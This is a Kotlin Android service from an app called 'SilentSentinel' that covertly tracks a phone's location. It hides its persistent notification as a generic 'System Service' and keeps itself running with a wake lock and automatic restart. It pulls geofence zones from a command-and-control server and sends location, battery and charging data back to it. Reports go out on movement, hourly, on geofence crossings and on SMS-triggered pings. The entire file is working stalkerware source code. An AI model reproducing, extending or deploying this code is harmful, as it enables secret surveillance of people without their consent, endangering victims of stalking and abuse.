package com.silentsentinel

import android.app.*
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class LocationService : Service() {

    private lateinit var locationManager: LocationManager
    private lateinit var wakeLock: PowerManager.WakeLock
    private var lastReportedLat = 0.0
    private var lastReportedLng = 0.0
    private var lastHeartbeatTs = 0L
    private val MIN_MOVEMENT_METERS = 50f
    private val HEARTBEAT_INTERVAL_MS = 3600000L  // 1 hour
    private var smsTriggerSender: String? = null

    // Geofence engine (lazy init)
    private lateinit var geofenceEngine: GeofenceEngine

    override fun onCreate() {
        super.onCreate()
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        geofenceEngine = GeofenceEngine(this)

        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "SilentSentinel::WakerLock"
        )

        // Fetch geofence config from C2 on start
        Thread {
            val zones = C2Client.fetchGeofenceConfig()
            if (zones != null) {
                geofenceEngine.loadZonesFromJson(zones)
            }
        }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Check if this was triggered by SMS ping
        if (intent?.action == "com.silentsentinel.TRIGGER_PING") {
            smsTriggerSender = intent.getStringExtra("trigger_sender")
        }

        val channelId = "silent_sentinel_channel"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Sensor Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "System sensor monitoring"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Monitoring sensors")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()

        startForeground(31337, notification)

        wakeLock.acquire(10 * 60 * 1000L)
        startListening()

        return START_STICKY
    }

    private fun startListening() {
        try {
            val minTimeMs = 120000L
            val minDistMeters = 50f

            val listener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    processLocation(location)
                }

                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }

            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER, minTimeMs, minDistMeters, listener
                )
            }

            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER, minTimeMs, minDistMeters, listener
                )
            }

            val lastGps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val lastNet = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            val best = lastGps ?: lastNet
            if (best != null) processLocation(best)

        } catch (e: SecurityException) {
            stopSelf()
        }
    }

    private fun processLocation(location: Location) {
        val lat = location.latitude
        val lng = location.longitude
        val now = System.currentTimeMillis()

        // --- SMS Trigger: always report regardless of movement ---
        if (smsTriggerSender != null) {
            smsTriggerSender = null
            lastReportedLat = lat
            lastReportedLng = lng
            sendHeartbeatFull(location)
            return
        }

        // --- Movement check ---
        val hasMoved = if (lastReportedLat != 0.0 && lastReportedLng != 0.0) {
            val results = FloatArray(1)
            Location.distanceBetween(
                lastReportedLat, lastReportedLng,
                lat, lng, results
            )
            results[0] >= MIN_MOVEMENT_METERS
        } else true

        if (hasMoved) {
            lastReportedLat = lat
            lastReportedLng = lng

            // --- Standard location report ---
            Thread {
                C2Client.report(
                    lat = lat, lng = lng,
                    accuracy = location.accuracy,
                    provider = location.provider,
                    batteryLevel = getBatteryLevel()
                )
            }.start()

            // --- Geofence check ---
            val events = geofenceEngine.checkZones(lat, lng)
            for (event in events) {
                Thread {
                    C2Client.reportGeofenceEvent(event.zoneName, event.type, event.lat, event.lng)
                }.start()
            }
        }

        // --- Heartbeat (periodic full snapshot) ---
        if (now - lastHeartbeatTs >= HEARTBEAT_INTERVAL_MS || lastHeartbeatTs == 0L) {
            lastHeartbeatTs = now
            sendHeartbeatFull(location)
        }
    }

    private fun sendHeartbeatFull(location: Location) {
        Thread {
            C2Client.sendHeartbeat(
                context = this@LocationService,
                lat = location.latitude,
                lng = location.longitude,
                accuracy = location.accuracy,
                provider = location.provider,
                batteryLevel = getBatteryLevel(),
                isCharging = isDeviceCharging()
            )
        }.start()
    }

    private fun getBatteryLevel(): Int {
        val intent = registerReceiver(null, Intent(Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level >= 0 && scale > 0) (level * 100 / scale) else -1
    }

    private fun isDeviceCharging(): Boolean {
        val intent = registerReceiver(null, Intent(Intent.ACTION_BATTERY_CHANGED))
        val status = intent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
        return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
               status == android.os.BatteryManager.BATTERY_STATUS_FULL
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        if (::wakeLock.isInitialized && wakeLock.isHeld) wakeLock.release()
        super.onDestroy()
    }
}